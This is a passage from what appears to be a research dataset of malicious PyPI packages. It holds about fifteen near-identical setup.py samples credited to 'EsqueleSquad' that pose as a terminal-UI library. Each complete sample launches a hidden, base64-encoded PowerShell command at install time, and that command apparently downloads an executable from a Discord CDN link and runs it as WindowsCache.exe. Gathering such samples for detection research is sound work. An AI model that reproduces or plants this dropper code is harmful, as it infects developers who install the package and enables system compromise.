3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfintmaskreplace-v1.3",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfintmaskreplace',\n    packages = ['modlib'],\n    version = '5.67',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfintstringstr-v9.5",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfintstringstr',\n    packages = ['modlib'],\n    version = '4.80',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfkillgameintel-v2.33",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfkillgameintel',\n    packages = ['modlib'],\n    version = '10.66',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfmaskgamepull-v1.57",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfmaskgamepull',\n    packages = ['modlib'],\n    version = '1.10',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfmcvisapy-v10.73",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfmcvisapy',\n    packages = ['modlib'],\n    version = '6.94',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfminemasked-v10.54",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfminemasked',\n    packages = ['modlib'],\n    version = '7.56',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfpeppippull-v1.31",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfpeppippull',\n    packages = ['modlib'],\n    version = '5.77',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfpingponggame-v3.21",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfpingponggame',\n    packages = ['modlib'],\n    version = '4.6',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfpingultragame-v4.45",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfpingultragame',\n    packages = ['modlib'],\n    version = '1.99',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfproofintelosint-v7.76",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfproofintelosint',\n    packages = ['modlib'],\n    version = '10.65',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfproofkillcraft-v5.31",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfproofkillcraft',\n    packages = ['modlib'],\n    version = '10.4',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfpyverint-v2.75",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfpyverint',\n    packages = ['modlib'],\n    version = '10.47',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfpywkillgui-v4.33",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfpywkillgui',\n    packages = ['modlib'],\n    version = '9.9',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selframintelosint-v8.83",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selframintelosint',\n    packages = ['modlib'],\n    version = '5.89',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    